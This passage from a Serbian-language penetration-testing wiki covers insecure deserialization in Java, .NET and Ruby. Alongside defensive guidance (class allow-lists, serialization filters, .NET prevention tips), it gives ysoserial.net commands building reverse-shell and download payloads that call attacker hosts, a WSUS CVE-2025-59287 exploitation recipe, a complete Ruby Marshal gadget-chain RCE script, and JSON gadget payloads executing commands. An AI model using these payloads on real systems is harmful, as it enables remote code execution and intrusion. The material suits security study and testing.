- Klase koje se očekuju za deserializaciju su poznate.

Prepišite metodu **`resolveClass()`** kako biste ograničili deserializaciju samo na dozvoljene klase. To sprečava deserializaciju bilo koje klase osim onih eksplicitno dozvoljenih, kao u sledećem primeru koji ograničava deserializaciju samo na klasu `Bicycle`:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Korišćenje Java Agent-a za poboljšanje bezbednosti** nudi rezervno rešenje kada izmene koda nisu moguće. Ova metoda se primenjuje pretežno za **blacklisting harmful classes**, koristeći JVM parameter:
```
-javaagent:name-of-agent.jar
```
Ovo obezbeđuje način za dinamičku zaštitu deserializacije, idealno za okruženja u kojima su trenutne izmene koda nepraktične.

Pogledajte primer u [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**Implementing Serialization Filters**: Java 9 je uveo filtere za serializaciju preko **`ObjectInputFilter`** interfejsa, pružajući moćan mehanizam za specificiranje kriterijuma koje serializovani objekti moraju ispuniti pre nego što budu deserializovani. Ovi filteri se mogu primeniti globalno ili po streamu, nudeći granularnu kontrolu nad procesom deserializacije.

Da biste koristili filtere za serializaciju, možete postaviti globalni filter koji važi za sve operacije deserializacije ili ga dinamički konfigurisati za određene streamove. Na primer:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Korišćenje eksternih biblioteka za poboljšanu bezbednost**: Libraries such as **NotSoSerial**, **jdeserialize**, and **Kryo** offer advanced features for controlling and monitoring Java deserialization. These libraries can provide additional layers of security, such as whitelisting or blacklisting classes, analyzing serialized objects before deserialization, and implementing custom serialization strategies.

- **NotSoSerial** presreće deserialization procese da spreči izvršavanje untrusted code.
- **jdeserialize** omogućava analizu serialized Java objekata bez deserializacije, pomažući da se identifikuje potentially malicious sadržaj.
- **Kryo** je alternativan serialization framework koji naglašava brzinu i efikasnost, nudeći konfigurisane serialization strategije koje mogu poboljšati bezbednost.

### References

- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- Deserialization and ysoserial talk: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
- [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
- [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
- Talk about gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) and slides: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
- Marshalsec paper: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
- [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
- [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
- [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
- Java and .Net JSON deserialization **paper:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** talk: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) and slides: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- Deserialziations CVEs: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injection & log4Shell

Pronađite šta je **JNDI Injection, how to abuse it via RMI, CORBA & LDAP and how to exploit log4shell** (i primer ove ranjivosti) na sledećoj stranici:


{{#ref}}
jndi-java-naming-and-directory-interface-and-log4shell.md
{{#endref}}

## JMS - Java Message Service

> The **Java Message Service** (**JMS**) API je Java message-oriented middleware API za slanje poruka između dva ili više klijenata. To je implementacija za rešavanje producer–consumer problema. JMS je deo Java Platform, Enterprise Edition (Java EE), i bio je definisan specifikacijom razvijenom u Sun Microsystems, ali kojom od tada upravlja Java Community Process. To je messaging standard koji omogućava komponentama aplikacija zasnovanim na Java EE da kreiraju, šalju, primaju i čitaju poruke. Omogućava komunikaciju između različitih komponenti distribuirane aplikacije da bude loosely coupled, reliable, i asynchronous. (From [Wikipedia](https://en.wikipedia.org/wiki/Java_Message_Service)).

### Products

Postoji nekoliko proizvoda koji koriste ovaj middleware za slanje poruka:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (1056).png>)

### Exploitation

Dakle, u suštini postoji **puno servisa koji koriste JMS na opasan način**. Zato, ako imate **dovoljno privilegija** da šaljete poruke tim servisima (obično će vam trebati validni credentials) mogli biste biti u mogućnosti da pošaljete **malicious objects serialized koje će consumer/subscriber deserializovati**.\
To znači da u ovoj eksploataciji svi **klijenti koji budu koristili tu poruku biće zaraženi**.

Treba imati na umu da čak i ako je servis ranjiv (jer nesigurno deserializuje korisnički input), i dalje morate pronaći validne gadgets da biste eksploatisali ranjivost.

Alat [JMET](https://github.com/matthiaskaiser/jmet) je napravljen da **poveže i napadne te servise slanjem više malicious objects serialized koristeći poznate gadgets**. Ovi exploit-i će raditi ako je servis i dalje ranjiv i ako je bilo koji od korišćenih gadgets prisutan u ranjivoj aplikaciji.

### References

- [Patchstack advisory – Everest Forms unauthenticated PHP Object Injection (CVE-2025-52709)](https://patchstack.com/articles/critical-vulnerability-impacting-over-100k-sites-patched-in-everest-forms-plugin/)

- JMET talk: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
- Slides: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

U kontekstu .Net-a, deserialization exploit-i funkcionišu slično onima u Java, gde se gadgets zloupotrebljavaju da pokrenu specifičan code tokom deserialization objekta.

### Fingerprint

#### WhiteBox

Izvorni kod treba pregledati za pojave:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Fokus treba biti na serializer-ima koji dozvoljavaju da tip bude određen promenljivom pod kontrolom korisnika.

#### BlackBox

Pretraga bi trebalo da cilja Base64 enkodirani string **AAEAAAD/////** ili bilo koji sličan obrazac koji bi mogao biti deserializovan na server strani, dodeljujući kontrolu nad tipom koji će biti deserializovan. Ovo može uključivati, ali nije ograničeno na, **JSON** ili **XML** strukture koje sadrže `TypeObject` ili `$type`.

### ysoserial.net

U ovom slučaju možete koristiti alat [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) kako biste **kreirali deserialization exploit-e**. Nakon što preuzmete git repository, treba da **kompajlirate alat** koristeći, na primer, Visual Studio.

If you want to learn about **how does ysoserial.net creates it's exploit** you can [**check this page where is explained the ObjectDataProvider gadget + ExpandedWrapper + Json.Net formatter**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

Glavne opcije **ysoserial.net** su: **`--gadget`**, **`--formatter`**, **`--output`** i **`--plugin`.**

- **`--gadget`** koristi se da označi gadget koji će biti zloupotrebljen (označava klasu/funkciju koja će biti zloupotrebljena tokom deserialization da izvrši komande).
- **`--formatter`** koristi se da označi metod kojim će se serialize-ovati exploit (potrebno je znati koju biblioteku back-end koristi za deserializaciju payload-a i koristiti istu biblioteku za serializaciju).
- **`--output`** koristi se da označi da li želite exploit u **raw** ili **base64** enkodiranom obliku. _Napomena: **ysoserial.net** će **encode-ovati** payload koristeći **UTF-16LE** (enkodiranje podrazumevano na Windows-u), tako da ako dobijete raw i samo ga enkodujete sa linux konzole, možete imati **encoding compatibility problems** koji će sprečiti exploit da radi ispravno (u HTB JSON box payload je radio i u UTF-16LE i u ASCII, ali to ne znači da će uvek raditi)._
- **`--plugin`** ysoserial.net podržava plugin-ove za kreiranje exploit-a za specifične framework-e kao što je ViewState

#### Još ysoserial.net parametara

- `--minify` će obezbediti **manji payload** (ako je moguće)
- `--raf -f Json.Net -c "anything"` Ovo će prikazati sve gadgets koji se mogu koristiti sa datim formatter-om (`Json.Net` u ovom primeru)
- `--sf xml` možete **naznačiti gadget** (`-g`) i ysoserial.net će pretražiti formatter-e koji sadrže "xml" (case insensitive)

**ysoserial examples** to create exploits:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** takođe ima **veoma interesantan parametar** koji pomaže da se bolje razume kako svaki exploit radi: `--test`\
Ako navedete ovaj parametar, **ysoserial.net** će **pokušati** **exploit lokalno,** tako da možete testirati da li će vaš payload raditi ispravno.\
Ovaj parametar je koristan jer, ako pregledate kod, naći ćete delove koda poput sledećeg (iz [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
To znači da će, kako bi testirao exploit, kod pozvati [serializersHelper.JsonNet_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
U **prethodnom primeru kod je ranjiv na kreirani exploit**. Dakle, ako nađete nešto slično u .Net aplikaciji, to verovatno znači da je i ta aplikacija ranjiva.\
Zato parametar **`--test`** omogućava da shvatimo **koji delovi koda su ranjivi** na desrialization exploit koji **ysoserial.net** može da kreira.

### ViewState

Pogledajte [ovaj POST o tome **kako pokušati da iskoristite __ViewState parametar kod .Net**](exploiting-__viewstate-parameter.md) da biste **izvršili proizvoljan kod.** Ako **već poznajete tajne** koje koristi žrtvina mašina, [**pročitajte ovaj post da biste znali kako izvršiti kod**](exploiting-__viewstate-knowing-the-secret.md).

### Praktičan slučaj: WSUS AuthorizationCookie & Reporting SOAP → BinaryFormatter/SoapFormatter RCE

- Pogođeni endpointi:
- `/SimpleAuthWebService/SimpleAuth.asmx` → GetCookie() AuthorizationCookie decrypted then deserialized with BinaryFormatter.
- `/ReportingWebService.asmx` → ReportEventBatch and related SOAP ops that reach SoapFormatter sinks; base64 gadget is processed when the WSUS console ingests the event.
- Osnovni uzrok: attacker‑controlled bytes reach legacy .NET formatters (BinaryFormatter/SoapFormatter) without strict allow‑lists/binders, so gadget chains execute as the WSUS service account (often SYSTEM).

Minimalna eksploatacija (Reporting put):
1) Generišite .NET gadget pomoću ysoserial.net (BinaryFormatter ili SoapFormatter) i ispišite base64, na primer:
```powershell
# Reverse shell (EncodedCommand) via BinaryFormatter
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "powershell -NoP -W Hidden -Enc <BASE64_PS>"

# Simple calc via SoapFormatter (test)
ysoserial.exe -g TypeConfuseDelegate -f SoapFormatter -o base64 -c "calc.exe"
```
2) Sastavite SOAP za `ReportEventBatch` koji ugrađuje base64 gadget i pošaljite ga koristeći POST na `/ReportingWebService.asmx`.
3) Kada admin otvori WSUS konzolu, događaj se deserializuje i gadget se aktivira (RCE kao SYSTEM).

AuthorizationCookie / GetCookie()
- Lažni AuthorizationCookie može biti prihvaćen, dekriptovan i prosleđen BinaryFormatter sinku, omogućavajući pre‑auth RCE ako je dostupan.

Javni PoC (tecxx/CVE-2025-59287-WSUS) parametri:
```powershell
$lhost = "192.168.49.51"
$lport = 53
$targetURL = "http://192.168.51.89:8530"
```
See [Windows Local Privilege Escalation – WSUS](../../windows-hardening/windows-local-privilege-escalation/README.md)

### Prevencija

To mitigate the risks associated with deserialization in .Net:

- **Izbegavajte da tokovi podataka definišu tipove svojih objekata.** Koristite `DataContractSerializer` ili `XmlSerializer` kada je moguće.
- **Za `JSON.Net`, postavite `TypeNameHandling` na `None`:** `TypeNameHandling = TypeNameHandling.None`
- **Izbegavajte korišćenje `JavaScriptSerializer` sa `JavaScriptTypeResolver`.**
- **Ograničite tipove koji se mogu deserializovati**, razumevajući inherentne rizike .Net tipova, kao što je `System.IO.FileInfo`, koji može menjati osobine fajlova na serveru, potencijalno dovodeći do denial of service napada.
- **Budite oprezni sa tipovima koji imaju rizična svojstva**, kao što je `System.ComponentModel.DataAnnotations.ValidationException` sa svojim `Value` svojstvom, koje može biti iskorišćeno.
- **Sigurno kontrolišite instanciranje tipova** kako biste sprečili napadače da utiču na proces deserializacije, što može učiniti i `DataContractSerializer` ili `XmlSerializer` ranjivim.
- **Implementirajte kontrole bele liste** koristeći prilagođeni `SerializationBinder` za `BinaryFormatter` i `JSON.Net`.
- **Budite informisani o poznatim nesigurnim deserialization gadget-ima** unutar .Net-a i osigurajte da deserializatori ne instanciraju takve tipove.
- **Izolujte potencijalno rizičan kod** od koda sa pristupom internetu kako biste izbegli izlaganje poznatih gadget-a, kao što je `System.Windows.Data.ObjectDataProvider` u WPF aplikacijama, nepoverljivim izvorima podataka.

### **Reference**

- Java i .Net JSON deserializacija **paper:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** predavanje: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) i slajdovi: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp)
- [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
- [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

U Ruby-ju, serijalizacija se ostvaruje pomoću dve metode unutar biblioteke **marshal**. Prva metoda, poznata kao **dump**, koristi se za pretvaranje objekta u niz bajtova. Ovaj proces se naziva serijalizacija. Suprotno tome, druga metoda, **load**, koristi se za vraćanje niza bajtova nazad u objekat, proces poznat kao deserializacija.

Za zaštitu serijalizovanih objekata, **Ruby koristi HMAC (Hash-Based Message Authentication Code)**, osiguravajući integritet i autentičnost podataka. Ključ koji se koristi u tu svrhu čuva se na jednom od sledećih mesta:

- `config/environment.rb`
- `config/initializers/secret_token.rb`
- `config/secrets.yml`
- `/proc/self/environ`

**Ruby 2.X generički lanac gadget-a za deserializaciju koji vodi do RCE (više informacija u** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Other RCE chain to exploit Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Ruby .send() metoda

Kao što je objašnjeno u [**this vulnerability report**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/), ako neki nesanitizovani unos od korisnika dospe do `.send()` metode Ruby objekta, ova metoda omogućava da se **pozove bilo koja druga metoda** objekta sa bilo kojim parametrima.

Na primer, pozivanje eval i zatim ruby koda kao drugi parametar omogućava izvršavanje proizvoljnog koda:
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
Štaviše, ako je samo jedan parametar od **`.send()`** kontrolisan od strane napadača, kao što je pomenuto u prethodnom writeup, moguće je pozvati bilo koju metodu objekta koja **ne zahteva argumente** ili čiji argumenti imaju **podrazumevane vrednosti**.\  
Za ovo, moguće je izlistati sve metode objekta da bi se **pronašle neke interesantne metode koje ispunjavaju te zahteve**
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
### Ruby class pollution

Proverite kako je moguće [pollute a Ruby class and abuse it in here](ruby-class-pollution.md).

### Ruby _json pollution

Kada se u body pošalju neke vrednosti koje se ne mogu hash-ovati, kao što su nizovi, one će biti dodate u novi ključ nazvan `_json`. Međutim, napadač takođe može u body poslati vrednost pod imenom `_json` sa proizvoljnim vrednostima koje želi. Ako, na primer, backend proverava verodostojnost nekog parametra, a zatim koristi `_json` parametar za izvršenje neke akcije, može doći do authorisation bypass.

Više informacija potražite na [Ruby _json pollution page](ruby-_json-pollution.md).

### Other libraries

Ova tehnika je preuzeta [**from this blog post**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared).

Postoje i druge Ruby biblioteke koje se mogu koristiti za serializaciju objekata i koje zbog toga mogu biti zloupotrebljene za dobijanje RCE tokom insecure deserialization. Sledeća tabela prikazuje neke od tih biblioteka i metod koji se poziva iz učitane klase kad god se deserializuje (funkcija koju je moguće zloupotrebiti za dobijanje RCE):

<table data-header-hidden><thead><tr><th width="179"></th><th width="146"></th><th></th></tr></thead><tbody><tr><td><strong>Biblioteka</strong></td><td><strong>Ulazni podaci</strong></td><td><strong>Metod koji se poziva unutar klase</strong></td></tr><tr><td>Marshal (Ruby)</td><td>Binary</td><td><code>_load</code></td></tr><tr><td>Oj</td><td>JSON</td><td><code>hash</code> (class needs to be put into hash(map) as key)</td></tr><tr><td>Ox</td><td>XML</td><td><code>hash</code> (class needs to be put into hash(map) as key)</td></tr><tr><td>Psych (Ruby)</td><td>YAML</td><td><code>hash</code> (class needs to be put into hash(map) as key)<br><code>init_with</code></td></tr><tr><td>JSON (Ruby)</td><td>JSON</td><td><code>json_create</code> ([see notes regarding json_create at end](#table-vulnerable-sinks))</td></tr></tbody></table>

Osnovni primer:
```ruby
# Existing Ruby class inside the code of the app
class SimpleClass
def initialize(cmd)
@cmd = cmd
end

def hash
system(@cmd)
end
end

# Exploit
require 'oj'
simple = SimpleClass.new("open -a calculator") # command for macOS
json_payload = Oj.dump(simple)
puts json_payload

# Sink vulnerable inside the code accepting user input as json_payload
Oj.load(json_payload)
```
Prilikom pokušaja zloupotrebe Oj, bilo je moguće pronaći gadget class koji je unutar svoje `hash` funkcije pozivao `to_s`, koji je pozivao spec, koji je pozivao fetch_path — što se moglo naterati da dohvati nasumičan URL, pružajući odličan detektor ovakvih unsanitized deserialization vulnerabilities.
```json
{
"^o": "URI::HTTP",
"scheme": "s3",
"host": "example.org/anyurl?",
"port": "anyport",
"path": "/",
"user": "anyuser",
"password": "anypw"
}
```
Štaviše, utvrđeno je da prethodnom tehnikom u sistemu nastaje i direktorijum, što predstavlja uslov za zloupotrebu drugog gadgeta kako bi se ovo pretvorilo u kompletan RCE sa nečim poput:
```json
{
"^o": "Gem::Resolver::SpecSpecification",
"spec": {
"^o": "Gem::Resolver::GitSpecification",
"source": {
"^o": "Gem::Source::Git",
"git": "zip",
"reference": "-TmTT=\"$(id>/tmp/anyexec)\"",
"root_dir": "/tmp",
"repository": "anyrepo",
"name": "anyname"
},
"spec": {
"^o": "Gem::Resolver::Specification",
"name": "name",
"dependencies": []
}
}
}
```
Check for more details in the [**original post**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared).

### Bootstrap keširanje

Not really a desearilization vuln but a nice trick to abuse bootstrap caching to to get RCE from a rails application with an arbitrary file write (find the complete [original post in here](https://blog.convisoappsec.com/en/from-arbitrary-file-write-to-rce-in-restricted-rails-apps/)).

Below is a short summary of the steps detailed in the article for exploiting an arbitrary file write vulnerability by abusing Bootsnap caching:

- Identify the Vulnerability and Environment

Rails aplikacija ima funkcionalnost za upload fajlova koja napadaču dozvoljava arbitrarno upisivanje fajlova. Iako aplikacija radi sa restrikcijama (samo određeni direktorijumi kao tmp su writable zbog Docker’s non-root user), to i dalje dozvoljava upis u Bootsnap cache direktorijum (tipično pod tmp/cache/bootsnap).

- Understand Bootsnap’s Cache Mechanism

Bootsnap ubrzava Rails boot times keširanjem kompajliranog Ruby koda, YAML i JSON fajlova. Čuva cache fajlove koji uključuju cache key header (sa poljima kao što su Ruby version, file size, mtime, compile options, itd.) nakon čega sledi kompajlirani kod. Ovaj header se koristi za validaciju cache-a pri pokretanju aplikacije.

- Gather File Metadata

Napadač prvo izabere ciljni fajl koji se verovatno učitava pri pokretanju Rails-a (na primer, set.rb iz Ruby’s standard library). Izvršavanjem Ruby koda unutar containera izvlače ključne metapodatke (kao što su RUBY_VERSION, RUBY_REVISION, size, mtime, i compile_option). Ovi podaci su neophodni za kreiranje validnog cache key-a.

- Compute the Cache File Path

Replikovanjem Bootsnap-ovog FNV-1a 64-bit hash mehanizma određuje se tačna putanja cache fajla. Ovaj korak osigurava da je maliciozni cache fajl postavljen tačno tamo gde Bootsnap očekuje (npr. under tmp/cache/bootsnap/compile-cache-iseq/).

- Craft the Malicious Cache File

Napadač priprema payload koji:

- Executes arbitrary commands (for example, running id to show process info).
- Removes the malicious cache after execution to prevent recursive exploitation.
- Loads the original file (e.g., set.rb) to avoid crashing the application.

Ovaj payload se kompajlira u binarni Ruby kod i konkatenira sa pažljivo konstruisanim cache key header-om (koristeći prethodno prikupljene metapodatke i odgovarajući broj verzije za Bootsnap).

- Overwrite and Trigger Execution
Koristeći arbitrary file write ranjivost, napadač upisuje pripremljeni cache fajl na izračunatu lokaciju. Zatim pokreću restart servera (upisom u tmp/restart.txt, koji nadgleda Puma). Tokom restarta, kada Rails zahteva ciljani fajl, učitava se maliciozni cache fajl, što rezultuje remote code execution (RCE).



### Ruby Marshal eksploatacija u praksi (ažurirano)

Treat any path where untrusted bytes reach `Marshal.load`/`marshal_load` as an RCE sink. Marshal reconstructs arbitrary object graphs and triggers library/gem callbacks during materialization.


- Minimal vulnerable Rails code path:
```ruby
class UserRestoreController < ApplicationController
def show
user_data = params[:data]
if user_data.present?
deserialized_user = Marshal.load(Base64.decode64(user_data))
render plain: "OK: #{deserialized_user.inspect}"
else
render plain: "No data", status: :bad_request
end
end
end
```
- Uobičajene klase gadgeta viđene u stvarnim lancima: `Gem::SpecFetcher`, `Gem::Version`, `Gem::RequestSet::Lockfile`, `Gem::Resolver::GitSpecification`, `Gem::Source::Git`.
- Tipičan marker sporednog efekta ugrađen u payloads (izvršava se tokom unmarshal-a):
```
*-TmTT="$(id>/tmp/marshal-poc)"any.zip
```
Where it surfaces in real apps:
- Rails cache stores and session stores historically using Marshal
- Background job backends and file-backed object stores
- Any custom persistence or transport of binary object blobs

Industrialized gadget discovery:
- Grep-uj za constructors, `hash`, `_load`, `init_with`, or metode koje izazivaju side-effect i pozivaju se tokom unmarshal
- Koristi CodeQL’s Ruby unsafe deserialization upite da pratiš sources → sinks i otkriješ gadgete
- Validiraj pomoću javnih multi-format PoC-ova (JSON/XML/YAML/Marshal)


## References

- Trail of Bits – Marshal madness: A brief history of Ruby deserialization exploits: https://blog.trailofbits.com/2025/08/20/marshal-madness-a-brief-history-of-ruby-deserialization-exploits/
- elttam – Ruby 2.x Universal RCE Deserialization Gadget Chain: https://www.elttam.com/blog/ruby-deserialization/
- Phrack #69 – Rails 3/4 Marshal chain: https://phrack.org/issues/69/12.html
- CVE-2019-5420 (Rails 5.2 insecure deserialization): https://nvd.nist.gov/vuln/detail/CVE-2019-5420
- ZDI – RCE via Ruby on Rails Active Storage insecure deserialization: https://www.zerodayinitiative.com/blog/2019/6/20/remote-code-execution-via-ruby-on-rails-active-storage-insecure-deserialization
- Include Security – Discovering gadget chains in Rubyland: https://blog.includesecurity.com/2024/03/discovering-deserialization-gadget-chains-in-rubyland/
- GitHub Security Lab – Ruby unsafe deserialization (query help): https://codeql.github.com/codeql-query-help/ruby/rb-unsafe-deserialization/
- GitHub Security Lab – PoCs repo: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization
- Doyensec PR – Ruby 3.4 gadget: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/pull/1
- Luke Jahnke – Ruby 3.4 universal chain: https://nastystereo.com/security/ruby-3.4-deserialization.html
- Luke Jahnke – Gem::SafeMarshal escape: https://nastystereo.com/security/ruby-safe-marshal-escape.html
- Ruby 3.4.0-rc1 release: https://github.com/ruby/ruby/releases/tag/v3_4_0_rc1
- Ruby fix PR #12444: https://github.com/ruby/ruby/pull/12444
- Trail of Bits – Auditing RubyGems.org (Marshal findings): https://blog.trailofbits.com/2024/12/11/auditing-the-ruby-ecosystems-central-package-repository/
- watchTowr Labs – Is This Bad? This Feels Bad — GoAnywhere CVE-2025-10035: https://labs.watchtowr.com/is-this-bad-this-feels-bad-goanywhere-cve-2025-10035/
